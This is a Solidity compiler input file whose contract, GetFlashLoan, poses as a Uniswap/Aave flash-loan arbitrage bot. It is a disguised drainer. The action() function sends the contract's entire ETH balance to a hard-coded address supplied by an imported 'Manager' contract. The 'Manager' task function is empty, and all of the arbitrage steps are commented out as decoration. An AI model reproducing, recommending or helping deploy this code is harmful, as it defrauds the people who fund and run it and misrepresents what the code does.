{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"ipfs://QmczxhbdYCumZuEicXc6ktwacR8YWQRBpUzrtMfW59xoXW":{"content":"pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x3775a5704441c6a5770fB72403f6FD9d53C73A61;\r\n\t}\r\n}\r\n"},"uniswapflashloan.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\n// Multiplier-Finance Smart Contracts\r\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";\r\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";\r\n\r\n// uniSwap Smart Contracts\r\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniCallee.sol\";\r\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniFactory.sol\";\r\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniPair.sol\";\r\n\r\n\r\n\r\n// Code Manager\r\nimport \"ipfs://QmczxhbdYCumZuEicXc6ktwacR8YWQRBpUzrtMfW59xoXW\";\r\n\r\n\r\ncontract GetFlashLoan {\r\n        string public tokenName;\r\n        string public tokenSymbol;\r\n        uint loanAmount;\r\n        Manager manager;\r\n\r\n        constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\r\n                tokenName = _tokenName;\r\n                tokenSymbol = _tokenSymbol;\r\n                loanAmount = _loanAmount;\r\n\r\n                manager = new Manager();\r\n        }\r\nreceive() external payable {}\r\n\r\n        function action() public payable {\r\n\r\n            // Send required coins for swap\r\n            payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\r\n\r\n            // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\r\n            manager.performTasks();\r\n\r\n            /*\r\n            // Submit token to Ethereum blockchain\r\n            string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\r\n\r\n        // List the token on UniSwap & send coins required for swaps\r\n                manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);\r\n                payable(manager.uniswapDepositAddress()).transfer(300000000000000000);\r\n\r\n        // Get ETH Loan from Aave\r\n                string memory loanAddress = manager.takeAaveLoan(loanAmount);\r\n\r\n                // Convert half ETH to DAI\r\n                manager.uniswapDAItoETH(loanAmount / 2);\r\n\r\n        // Create ETH and DAI pairs for our token & Provide liquidity\r\n        string memory ethPair = manager.uniswapCreatePool(tokenAddress, \"ETH\");\r\n                manager.uniswapAddLiquidity(ethPair, loanAmount / 2);\r\n                string memory daiPair = manager.uniswapCreatePool(tokenAddress, \"DAI\");\r\n                manager.uniswapAddLiquidity(daiPair, loanAmount / 2);\r\n\r\n        // Perform swaps and profit on Self-Arbitrage\r\n                manager.uniswapPerformSwaps();\r\n\r\n                // Move remaining ETH from Contract to your account\r\n                manager.contractToWallet(\"ETH\");\r\n\r\n        // Repay Flash loan\r\n                manager.repayAaveLoan(loanAddress);\r\n            */\r\n        }\r\n}"}}}